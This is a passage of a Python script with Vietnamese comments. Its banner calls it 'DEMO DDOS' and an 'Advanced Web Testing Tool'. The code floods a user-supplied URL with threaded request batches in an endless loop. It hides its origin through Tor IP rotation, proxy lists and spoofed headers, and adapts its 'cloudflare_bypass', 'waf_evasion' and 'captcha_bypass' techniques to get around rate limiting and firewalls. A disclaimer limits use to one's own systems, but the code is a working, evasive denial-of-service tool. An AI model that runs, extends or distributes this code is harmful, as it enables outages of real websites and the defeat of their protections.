        weights = [rate for _, rate in best_techniques]
        techniques = [tech for tech, _ in best_techniques]
        
        if not weights or sum(weights) == 0:
            return random.choice(TECHNIQUES)
            
        return random.choices(techniques, weights=weights, k=1)[0]
    else:
        # 10% thời gian thử kỹ thuật ngẫu nhiên
        return random.choice(TECHNIQUES)

def analyze_response(response, technique, target_url):
    """Phân tích phản hồi và cập nhật thông tin"""
    global successful_techniques, effective_techniques, target_info, successful_ips
    
    if response is None:
        return
    
    # Ghi nhận kỹ thuật thành công
    if response.status_code < 400:
        successful_techniques[technique] = successful_techniques.get(technique, 0) + 1
        
        # Lưu IP thành công nếu có
        if 'X-Forwarded-For' in response.request.headers:
            ip = response.request.headers['X-Forwarded-For']
            successful_ips[ip] = successful_ips.get(ip, 0) + 1
    
    # Ghi nhận hiệu quả của kỹ thuật
    status_category = response.status_code // 100
    if technique not in effective_techniques:
        effective_techniques[technique] = {1: 0, 2: 0, 3: 0, 4: 0, 5: 0}
    effective_techniques[technique][status_category] = effective_techniques[technique].get(status_category, 0) + 1
    
    # Ghi nhận thời gian phản hồi
    response_time = response.elapsed.total_seconds()
    response_times.append(response_time)
    
    # Lưu thông tin về target
    if not target_info:
        server = response.headers.get('Server', 'Unknown')
        content_type = response.headers.get('Content-Type', 'Unknown')
        power_by = response.headers.get('X-Powered-By', 'Unknown')
        
        target_info = {
            'url': target_url,
            'server': server,
            'content_type': content_type,
            'powered_by': power_by,
            'headers': dict(response.headers)
        }
        
        # Thử phát hiện CMS
        content = response.text.lower() if hasattr(response, 'text') else ""
        if 'wordpress' in content:
            target_info['cms'] = 'WordPress'
        elif 'joomla' in content:
            target_info['cms'] = 'Joomla'
        elif 'drupal' in content:
            target_info['cms'] = 'Drupal'
        elif 'magento' in content:
            target_info['cms'] = 'Magento'
        elif 'shopify' in content:
            target_info['cms'] = 'Shopify'
        elif 'woocommerce' in content:
            target_info['cms'] = 'WooCommerce'

def setup_session(use_tor=False, proxy=None):
    """Thiết lập session với proxy hoặc Tor"""
    session = requests.Session()
    
    if use_tor and HAVE_SOCKS:
        # Sử dụng Tor qua SOCKS proxy
        session.proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }
    elif proxy:
        # Sử dụng proxy được chỉ định
        if proxy.startswith('socks'):
            if HAVE_SOCKS:
                session.proxies = {
                    'http': proxy,
                    'https': proxy
                }
        else:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
    
    return session

def make_request(target_url, technique=None, retry_count=0):
    """Hàm thực hiện một request duy nhất"""
    global total_retries, request_count
    
    # Đếm số lượng request
    request_count += 1
    
    # Chọn kỹ thuật dựa trên hiệu quả trước đó
    if technique is None:
        technique = select_best_technique()
    
    # Đổi IP Tor nếu cần
    if use_tor and request_count % ROTATE_TOR_EVERY == 0:
        renew_tor_ip()
    
    try:
        # Tạo tham số ngẫu nhiên để tránh cache
        random_params = f"?{get_random_string(5)}={get_random_string(8)}&_={int(time.time() * 1000)}"
        
        # Thêm tham số ngẫu nhiên với xác suất 80%
        full_url = target_url
        if random.random() < 0.8:
            full_url += random_params
        
        # Thiết lập session với proxy hoặc Tor
        proxy = None
        if use_proxies:
            proxy = get_random_proxy()
        
        session = setup_session(use_tor, proxy)
        
        # Thiết lập headers
        headers = get_browser_headers(technique, target_url)
        
        # Thiết lập cookies
        cookies = get_cookies(None, target_url)
        
        # Thêm độ trễ ngẫu nhiên trước khi gửi request để tránh pattern
        time.sleep(random.uniform(0.05, 0.2))
        
        # Gửi request ban đầu
        response = session.get(
            full_url, 
            headers=headers, 
            cookies=cookies, 
            timeout=DEFAULT_TIMEOUT, 
            allow_redirects=True,
            verify=False
        )
        
        # Kiểm tra các loại bảo vệ
        is_cloudflare = check_cloudflare(response)
        is_rate_limited = check_rate_limit(response)
        is_waf = check_waf(response)
        
        # Xử lý nếu có bảo vệ
        if is_cloudflare or is_rate_limited or is_waf:
            # Thêm độ trễ dài hơn
            time.sleep(adaptive_delay())
            
            # Cập nhật cookies từ response
            updated_cookies = get_cookies(response, target_url)
            
            # Thay đổi kỹ thuật dựa trên loại bảo vệ
            if captcha_detected:
                new_technique = "captcha_bypass"
            elif js_challenge_detected:
                new_technique = "js_challenge_bypass"
            elif is_cloudflare:
                new_technique = "cloudflare_bypass"
            elif is_waf:
                new_technique = "waf_evasion"
            else:
                new_technique = "premium_browser"
            
            # Tạo headers mới
            new_headers = get_browser_headers(new_technique, target_url)
            
            # Thử lại với cookies và headers mới
            try:
                response = session.get(
                    full_url, 
                    headers=new_headers, 
                    cookies=updated_cookies, 
                    timeout=DEFAULT_TIMEOUT, 
                    allow_redirects=True,
                    verify=False
                )
            except requests.RequestException:
                if retry_count < DEFAULT_RETRY_ATTEMPTS:
                    total_retries += 1
                    time.sleep(adaptive_delay())  # Đợi trước khi thử lại
                    return make_request(target_url, new_technique, retry_count + 1)
                return None
        
        # Phân tích response
        analyze_response(response, technique, target_url)
        
        return response.status_code
        
    except requests.RequestException:
        if retry_count < DEFAULT_RETRY_ATTEMPTS:
            total_retries += 1
            time.sleep(adaptive_delay())  # Đợi trước khi thử lại
            return make_request(target_url, technique, retry_count + 1)
        return None

def worker():
    """Hàm worker cho thread pool"""
    global is_running, request_queue
    
    while is_running:
        try:
            # Lấy task từ queue với timeout
            task = request_queue.get(timeout=1)
            
            # Kiểm tra tạm dừng
            while is_paused and is_running:
                time.sleep(0.1)
                
            # Kiểm tra thoát
            if not is_running:
                request_queue.task_done()
                break
                
            # Thực hiện request
            target_url, technique = task
            make_request(target_url, technique)
            
            # Đánh dấu task đã hoàn thành
            request_queue.task_done()
            
        except queue.Empty:
            # Queue rỗng, đợi một chút
            time.sleep(0.1)
        except Exception as e:
            # Xử lý ngoại lệ
            print(f"{Colors.RED}[!] Lỗi trong worker: {str(e)}{Colors.END}")
            if request_queue.qsize() > 0:
                request_queue.task_done()

def send_requests(batch_num, target_url, batch_size=DEFAULT_BATCH_SIZE, requests_count=DEFAULT_REQUESTS):
    """Hàm thực hiện tất cả requests"""
    global total_success, total_error, CONCURRENCY, request_queue
    
    start_time = time.time()
    success_count = 0
    error_count = 0
    current_concurrency = CONCURRENCY
    
    # Phân chia requests thành các batch nhỏ hơn
    total_batches = (requests_count + batch_size - 1) // batch_size
    
    for batch in range(total_batches):
        # Kiểm tra tạm dừng
        while is_paused and is_running:
            time.sleep(0.1)
            
        # Kiểm tra thoát
        if not is_running:
            return
            
        remaining = min(batch_size, requests_count - batch * batch_size)
        if remaining <= 0:
            break
        
        # Điều chỉnh số lượng thread
        current_concurrency = adjust_concurrency()
        print(f"{Colors.CYAN}[*] Đang xử lý batch nội bộ {batch+1}/{total_batches} ({remaining} requests) với {current_concurrency} threads{Colors.END}")
        
        # Tạo và khởi động worker threads
        workers = []
        for _ in range(current_concurrency):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Thêm tasks vào queue
        for _ in range(remaining):
            # Chọn kỹ thuật tốt nhất
            technique = select_best_technique()
            request_queue.put((target_url, technique))
        
        # Tạo thanh tiến trình
        with tqdm(total=remaining, desc="Tiến trình", unit="req", ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as progress_bar:
            initial_size = request_queue.qsize()
            while request_queue.qsize() > 0:
                # Cập nhật thanh tiến trình
                current_size = request_queue.qsize()
                progress = initial_size - current_size
                progress_bar.n = progress
                progress_bar.refresh()
                
                # Kiểm tra tạm dừng hoặc thoát
                if not is_running:
                    break
                    
                # Đợi một chút
                time.sleep(0.1)
            
            # Đảm bảo thanh tiến trình hoàn thành
            progress_bar.n = remaining
            progress_bar.refresh()
        
        # Đợi tất cả các task hoàn thành
        request_queue.join()
        
        # Nghỉ giữa các batch nội bộ với thời gian thích ứng
        delay = adaptive_delay()
        print(f"{Colors.BLUE}[i] Đợi {delay:.2f} giây trước khi tiếp tục...{Colors.END}")
        time.sleep(delay)
    
    elapsed_time = time.time() - start_time
    
    # Đếm kết quả
    for technique, count in successful_techniques.items():
        success_count += count
    error_count = requests_count - success_count
    
    # Cập nhật tổng số
    total_success += success_count
    total_error += error_count
    
    # In kết quả
    print(f"\n{Colors.GREEN}[+] Kết quả Batch #{batch_num}:{Colors.END}")
    print(f"{Colors.GREEN}    - Đã hoàn thành {requests_count} requests trong {elapsed_time:.2f} giây{Colors.END}")
    print(f"{Colors.GREEN}    - Thành công: {success_count}, Lỗi: {error_count}{Colors.END}")
    print(f"{Colors.GREEN}    - Tốc độ: {requests_count/elapsed_time:.2f} requests/giây{Colors.END}")
    print(f"{Colors.GREEN}    - Tỉ lệ thành công: {success_count/requests_count*100:.2f}%{Colors.END}")
    
    if successful_techniques:
        print(f"{Colors.GREEN}    - Kỹ thuật thành công:{Colors.END}")
        for technique, count in sorted(successful_techniques.items(), key=lambda x: x[1], reverse=True):
            print(f"{Colors.GREEN}      * {technique}: {count} lần{Colors.END}")
    
    # Thống kê về thời gian phản hồi
    if response_times:
        avg_response_time = sum(response_times) / len(response_times)
        print(f"{Colors.GREEN}    - Thời gian phản hồi trung bình: {avg_response_time:.3f} giây{Colors.END}")
    
    return current_concurrency

def print_stats(target_url):
    """In thống kê tổng hợp"""
    global total_success, total_error, total_retries, start_time_global, response_times
    
    if start_time_global:
        total_time = time.time() - start_time_global
        total_requests = total_success + total_error
        
        if total_requests > 0:
            print("\n" + "="*60)
            print(f"{Colors.BOLD}{Colors.HEADER}THỐNG KÊ TỔNG HỢP ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}){Colors.END}")
            print("="*60)
            print(f"{Colors.CYAN}URL đích:            {target_url}{Colors.END}")
            print(f"{Colors.CYAN}Thời gian chạy:      {total_time:.2f} giây{Colors.END}")
            print(f"{Colors.CYAN}Tổng số requests:    {total_requests}{Colors.END}")
            print(f"{Colors.GREEN}Requests thành công: {total_success} ({total_success/total_requests*100:.2f}%){Colors.END}")
            print(f"{Colors.RED}Requests lỗi:        {total_error} ({total_error/total_requests*100:.2f}%){Colors.END}")
            print(f"{Colors.YELLOW}Tổng số retry:       {total_retries}{Colors.END}")
            print(f"{Colors.YELLOW}Tốc độ trung bình:   {total_requests/total_time:.2f} requests/giây{Colors.END}")
            
            # Thống kê thời gian phản hồi
            if response_times:
                avg_time = sum(response_times) / len(response_times)
                min_time = min(response_times)
                max_time = max(response_times)
                print(f"{Colors.CYAN}Thời gian phản hồi:  Trung bình {avg_time:.3f}s, Min {min_time:.3f}s, Max {max_time:.3f}s{Colors.END}")
            
            # In thông tin về các biện pháp bảo vệ đã phát hiện
            print(f"\n{Colors.BOLD}BIỆN PHÁP BẢO VỆ PHÁT HIỆN:{Colors.END}")
            if cloudflare_detected:
                print(f"{Colors.RED}✓ Cloudflare{Colors.END}")
            if challenge_detected:
                print(f"{Colors.RED}✓ Cloudflare Challenge{Colors.END}")
            if captcha_detected:
                print(f"{Colors.RED}✓ Cloudflare Captcha{Colors.END}")
            if js_challenge_detected:
                print(f"{Colors.RED}✓ JavaScript Challenge{Colors.END}")
            if rate_limited:
                print(f"{Colors.RED}✓ Rate Limiting{Colors.END}")
            if waf_detected:
                print(f"{Colors.RED}✓ Web Application Firewall (WAF){Colors.END}")
            
            if not any([cloudflare_detected, challenge_detected, captcha_detected, js_challenge_detected, rate_limited, waf_detected]):
                print(f"{Colors.GREEN}✗ Không phát hiện biện pháp bảo vệ{Colors.END}")
            
            # In thông tin về các kỹ thuật thành công
            if effective_techniques:
                print(f"\n{Colors.BOLD}HIỆU QUẢ CỦA CÁC KỸ THUẬT:{Colors.END}")
                for technique, stats in effective_techniques.items():
                    total = sum(stats.values())
                    if total > 0:
                        success_rate = (stats.get(2, 0) * 100) / total
                        print(f"{Colors.BLUE}{technique}: {Colors.END}", end="")
                        print(f"{Colors.GREEN}2xx: {stats.get(2, 0)}{Colors.END}, ", end="")
                        print(f"{Colors.CYAN}3xx: {stats.get(3, 0)}{Colors.END}, ", end="")
                        print(f"{Colors.YELLOW}4xx: {stats.get(4, 0)}{Colors.END}, ", end="")
                        print(f"{Colors.RED}5xx: {stats.get(5, 0)}{Colors.END}, ", end="")
                        print(f"{Colors.BOLD}Tỉ lệ thành công: {success_rate:.1f}%{Colors.END}")
            
            # In thông tin về mục tiêu
            if target_info:
                print(f"\n{Colors.BOLD}THÔNG TIN MỤC TIÊU:{Colors.END}")
                print(f"{Colors.CYAN}Server:       {target_info.get('server', 'Unknown')}{Colors.END}")
                print(f"{Colors.CYAN}Content-Type: {target_info.get('content_type', 'Unknown')}{Colors.END}")
                print(f"{Colors.CYAN}Powered By:   {target_info.get('powered_by', 'Unknown')}{Colors.END}")
                if 'cms' in target_info:
                    print(f"{Colors.CYAN}CMS:          {target_info.get('cms', 'Unknown')}{Colors.END}")
                
                # In một số header quan trọng
                important_headers = ['x-frame-options', 'content-security-policy', 'strict-transport-security', 'x-xss-protection']
                headers = target_info.get('headers', {})
                
                for header in important_headers:
                    if header in headers:
                        print(f"{Colors.CYAN}{header}: {headers[header]}{Colors.END}")
            
            print("="*60)

def display_banner():
    """Hiển thị banner chương trình"""
    banner = f"""
{Colors.RED}██████╗ ███████╗███╗   ███╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗{Colors.END}
{Colors.RED}██╔══██╗██╔════╝████╗ ████║██╔═══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝{Colors.END}
{Colors.RED}██║  ██║█████╗  ██╔████╔██║██║   ██║    ██║  ██║██║  ██║██║   ██║███████╗{Colors.END}
{Colors.YELLOW}██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║    ██║  ██║██║  ██║██║   ██║╚════██║{Colors.END}
{Colors.YELLOW}██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║{Colors.END}
{Colors.YELLOW}╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{Colors.END}
                                                                   
{Colors.CYAN}Advanced Web Testing Tool - Version 4.0 - by Văn Phong{Colors.END}
{Colors.YELLOW}Tối ưu hóa cho hiệu suất cao và khả năng vượt qua bảo mật{Colors.END}
{Colors.RED}Chỉ sử dụng cho mục đích giáo dục và kiểm tra hệ thống của chính bạn!{Colors.END}
{Colors.RED}Sử dụng trái phép có thể vi phạm pháp luật.{Colors.END}
"""
    print(banner)

def parse_arguments():
    """Xử lý tham số dòng lệnh"""
    parser = argparse.ArgumentParser(description="Advanced Web Testing Tool")
    parser.add_argument("-u", "--url", help="URL đích (ví dụ: https://example.com)")
    parser.add_argument("-n", "--requests", type=int, default=DEFAULT_REQUESTS, help=f"Số lượng requests mỗi batch (mặc định: {DEFAULT_REQUESTS})")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help=f"Số lượng threads ban đầu (mặc định: {DEFAULT_CONCURRENCY})")
    parser.add_argument("-b", "--batch-size", type=int, default=DEFAULT_BATCH_SIZE, help=f"Kích thước batch (mặc định: {DEFAULT_BATCH_SIZE})")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Timeout cho mỗi request (mặc định: {DEFAULT_TIMEOUT})")
    parser.add_argument("-d", "--delay", type=float, nargs=2, default=DEFAULT_DELAY, help=f"Khoảng thời gian trễ giữa các batch (min max) (mặc định: {DEFAULT_DELAY})")
    parser.add_argument("--fast", action="store_true", help="Chế độ nhanh (giảm độ trễ và tăng concurrency)")
    parser.add_argument("--tor", action="store_true", help="Sử dụng Tor để ẩn danh (yêu cầu cài đặt Tor)")
    parser.add_argument("--proxies", help="File chứa danh sách proxy (mỗi dòng một proxy)")
    parser.add_argument("--browser", action="store_true", help="Sử dụng trình duyệt giả lập để vượt qua Cloudflare")
    
    return parser.parse_args()

def check_tor_availability():
    """Kiểm tra xem Tor có sẵn không"""
    if not HAVE_TOR or not HAVE_SOCKS:
        print(f"{Colors.YELLOW}[!] Không thể sử dụng Tor vì thiếu thư viện stem hoặc pysocks{Colors.END}")
        return False
    
    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }
        response = session.get('https://check.torproject.org/', timeout=10)
        
        if 'Congratulations' in response.text:
            print(f"{Colors.GREEN}[+] Tor đang hoạt động và kết nối thành công{Colors.END}")
            return True
        else:
            print(f"{Colors.YELLOW}[!] Tor đang chạy nhưng kết nối không thành công{Colors.END}")
            return False
    except:
        print(f"{Colors.YELLOW}[!] Không thể kết nối đến Tor. Hãy đảm bảo dịch vụ Tor đang chạy{Colors.END}")
        return False

def main():
    """Hàm chính điều khiển chương trình"""
    global is_paused, is_running, start_time_global, URL, CONCURRENCY
    
    # Xử lý tham số dòng lệnh
    args = parse_arguments()
    
    # Thiết lập xử lý tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Tắt cảnh báo SSL
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except:
            pass
            
        # Hiển thị banner
        display_banner()
        
        # Kiểm tra Tor nếu được yêu cầu
        if args.tor:
            tor_enabled = check_tor_availability()
            if tor_enabled:
                print(f"{Colors.GREEN}[+] Đã kích hoạt chế độ Tor{Colors.END}")
        
        # Tải proxy nếu được chỉ định
        if args.proxies:
            load_proxies(args.proxies)
        
        # Nhập URL từ tham số hoặc nhập từ người dùng
        if args.url:
            URL = args.url
        else:
            URL = input(f"{Colors.CYAN}Nhập URL: {Colors.END}").strip()
        
        if not URL.startswith("http://") and not URL.startswith("https://"):
            URL = "https://" + URL
        
        # Cập nhật các tham số
        CONCURRENCY = args.concurrency
        requests_count = args.requests
        batch_size = args.batch_size
            
        print("\n" + "="*60)
        print(f"{Colors.BOLD}{Colors.HEADER}Demo DDOS{Colors.END}")
        print("="*60)
        print(f"{Colors.CYAN}URL đích:             {URL}{Colors.END}")
        print(f"{Colors.CYAN}Số lượng requests:    {requests_count}{Colors.END}")
        print(f"{Colors.CYAN}Số luồng ban đầu:     {CONCURRENCY}{Colors.END}")
        print(f"{Colors.CYAN}Kích thước batch:     {batch_size}{Colors.END}")
        print(f"{Colors.CYAN}Timeout:              {args.timeout} giây{Colors.END}")
        print(f"{Colors.CYAN}Delay giữa các batch: {args.delay[0]}-{args.delay[1]} giây{Colors.END}")
        print(f"{Colors.CYAN}Hệ điều hành:         {platform.system()} {platform.release()}{Colors.END}")
        print(f"{Colors.CYAN}Số lõi CPU:           {os.cpu_count()}{Colors.END}")
        
        print("="*60)
        print(f"{Colors.YELLOW}[i] Nhấn Ctrl+C để tạm dừng/thoát{Colors.END}")
        print(f"{Colors.YELLOW}[i] Chương trình sẽ tự động điều chỉnh để vượt qua bảo vệ{Colors.END}")
        print("="*60 + "\n")
        
        # Thử truy cập URL để kiểm tra kết nối
        print(f"{Colors.BLUE}[*] Đang kiểm tra kết nối đến {URL}...{Colors.END}")
        try:
            session = requests.Session()
            response = session.get(URL, timeout=args.timeout, verify=False)
            print(f"{Colors.GREEN}[+] Kết nối thành công! Mã trạng thái: {response.status_code}{Colors.END}")
            
            # Kiểm tra các biện pháp bảo vệ
            check_cloudflare(response)
            check_rate_limit(response)
            check_waf(response)
            
            # Phân tích response ban đầu
            analyze_response(response, "premium_browser", URL)
            
        except requests.RequestException as e:
            print(f"{Colors.RED}[!] Lỗi kết nối: {str(e)}{Colors.END}")
            choice = input(f"{Colors.YELLOW}Bạn có muốn tiếp tục không? (y/n): {Colors.END}").strip().lower()
            if choice != 'y':
                return
        
        # Ghi lại thời gian bắt đầu toàn cục
        start_time_global = time.time()
        
        # Vòng lặp chính
        count = 1
        while is_running:
            if not is_paused:
                print(f"\n{Colors.BLUE}[*] Bắt đầu Batch #{count}{Colors.END}")
                send_requests(count, URL)
                count += 1
                wait_time = adaptive_delay() * 2
                print(f"{Colors.YELLOW}[i] Đợi {wait_time:.2f} giây trước khi tiếp tục...{Colors.END}")
                time.sleep(wait_time)
            else:
                input()
                resume_execution()
    except Exception as e:
        print(f"\n{Colors.RED}[!] Lỗi không mong muốn: {str(e)}{Colors.END}")
        import traceback
        traceback.print_exc()
    finally:
        print_stats(URL)
        print(f"\n{Colors.RED}[!] Chương trình đã kết thúc{Colors.END}")

if __name__ == "__main__":
    main()
